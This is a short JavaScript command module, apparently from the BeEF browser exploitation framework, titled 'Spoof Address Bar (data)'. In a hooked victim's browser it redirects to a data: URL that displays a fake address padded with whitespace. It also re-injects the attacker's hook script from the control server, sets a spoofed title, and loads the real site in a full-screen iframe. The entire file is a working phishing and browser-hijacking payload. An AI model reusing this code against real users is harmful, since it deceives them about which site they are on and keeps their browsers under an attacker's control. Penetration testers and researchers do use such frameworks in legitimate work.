//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  var hook = server.net.httpproto + "://" + server.net.host + ":" + server.net.port + server.net.hook;

  try {
    window.location = "data:text/html,<%= @spoofed_url %><%= ' '*1337 %>?<script src='"+hook+"'></script><script>document.title='<%= @spoofed_url %>';server.dom.createIframe('fullscreen',{'src':'<%= @real_url %>'},{},null);</script>"
    server.debug("[Spoof Address Bar (data)] Redirecting to data URL...");
  } catch (e) {
    server.debug("[Spoof Address Bar (data)] could not redirect: "+e.message)
    server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=something went horribly wrong: " + e.message, server.are.status_error());
  }

});
